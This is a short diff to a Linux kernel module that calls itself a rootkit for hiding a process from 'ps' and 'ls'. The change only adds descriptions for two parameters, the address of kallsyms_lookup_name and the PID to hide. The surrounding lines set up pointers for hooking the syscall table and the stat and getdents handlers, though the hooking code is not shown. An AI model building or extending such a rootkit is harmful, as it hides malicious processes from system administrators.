@@ -21,7 +21,9 @@ MODULE_DESCRIPTION("Rootkit for hiding process from 'ps 'ls'");
 unsigned long kallsyms_lookup_addr;
 char *hiding_pid;
 module_param(kallsyms_lookup_addr, ulong, S_IRUGO);
+MODULE_PARM_DESC(kallsyms_lookup_addr, "kallsyms_lookup_name(char *path) function address");
 module_param(hiding_pid, charp, S_IRUGO); 
+MODULE_PARM_DESC(hiding_pid, "the process to hide pid");
 
 // defining the pointers to kallsyms_lookup_name function, syscall table, and old stat and old getdents handler
 unsigned long (*kallsyms_lookup_name)(const char *name);
